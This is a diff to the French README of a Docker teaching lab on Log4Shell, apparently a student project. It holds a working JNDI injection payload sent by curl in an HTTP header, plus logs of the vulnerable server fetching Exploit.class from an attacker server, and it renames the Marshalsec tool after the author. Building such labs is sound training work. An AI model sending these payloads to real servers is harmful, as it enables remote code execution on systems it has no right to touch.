@@ -2,7 +2,7 @@
 Version : 1.1
 Auteur : Farah Zerzeri
 Projet : DIABLE v3.0 – DSI ISFA 2025‑2026
-Technologies : Docker, Spring Boot, Log4j, Marshalsec, Flask, HTML
+Technologies : Docker, Spring Boot, Log4j, FarahSec, Flask, HTML
 Difficulté : Avancé
 Type : Remote Code Execution (RCE)
 
@@ -42,7 +42,7 @@ Log4j 2.14.1
 Endpoint vulnérable : /api/search
 Journalisation des headers → vecteur d’exploitation
 
-2️⃣ Serveur LDAP malveillant (Marshalsec)
+2️⃣ Serveur LDAP malveillant (FarahSec)
 
 Interprète la requête JNDI
 Renvoie une référence HTTP pointant vers le payload
@@ -87,7 +87,7 @@ log4shell-dockerlab-main/
 │   ├── build.gradle
 │   └── src/main/java/...
 │
-├── marshalsec/
+├── farahsec/
 │   ├── Dockerfile
 │   └── src/...
 │
@@ -113,6 +113,17 @@ Java JDK 8
 🚀 Installation & Lancement
 1️⃣ Cloner le projet
 Shellgit clone <repo>cd log4shell-dockerlab-mainAfficher plus de lignes
+Variables de ports configurables via `.env` :
+
+LAB_PORT=5000
+APP_PORT=5000
+VULN_HOST_PORT=8080
+VULNERABLE_PORT=8080
+LDAP_HOST_PORT=1389
+LDAP_PORT=1389
+ATTACKER_WEB_HOST_PORT=8888
+ATTACKER_HTTP_PORT=8888
+
 2️⃣ Démarrer l’environnement Docker
 Shelldocker compose up --build -dAfficher plus de lignes
 Containers créés :
@@ -120,27 +131,29 @@ Containers créés :
 farah-log4shell-vulnerable-app
 farah-log4shell-ldap
 
-3️⃣ Lancer le serveur HTTP attaquant
-Shellcd attacker-webserverpython3 -m http.server 8888Afficher plus de lignes
+3️⃣ Serveur HTTP attaquant
+Le service `attacker-webserver` est demarre automatiquement par Docker Compose.
 
 🌐 Accès aux services
 
-Service          URL
-Web vulnérable   http://localhost:8088
-Interface Flask  http://localhost:5000 
-Serveur LDAP     localhost:1389
+Service          URL / Port hote
+Web vulnérable   http://localhost:${VULN_HOST_PORT}
+Interface Flask  http://localhost:${LAB_PORT}
+Serveur LDAP     localhost:${LDAP_HOST_PORT}
+HTTP attaquant   http://localhost:${ATTACKER_WEB_HOST_PORT}
 
 💣 Exploitation Log4Shell
 Payload d'attaque
-curl -H 'X-Api-Version: ${jndi:ldap://<IP>:1389/Exploit}' http://<IP>:8088/api/search
+curl -H 'X-Api-Version: ${jndi:ldap://<LDAP_HOST>:<LDAP_PORT>/Exploit}' \
+     http://<TARGET_HOST>:<TARGET_PORT>/api/search
 
 Exemple
-curl -H 'X-Api-Version: ${jndi:ldap://172.18.37.180:1389/Exploit}' \
-     http://172.18.37.180:8088/api/search
+curl -H 'X-Api-Version: ${jndi:ldap://ldap:1389/Exploit}' \
+     http://vulnerable:8080/api/search
 
 🔍 Observation de l’attaque
 Logs LDAP
-Send LDAP reference result for Exploit redirecting to http://172.18.37.180:8888/Exploit.class
+Send LDAP reference result for Exploit redirecting to http://attacker-webserver:8888/Exploit.class
 
 Logs HTTP attaquant
 GET /Exploit.class HTTP/1.1
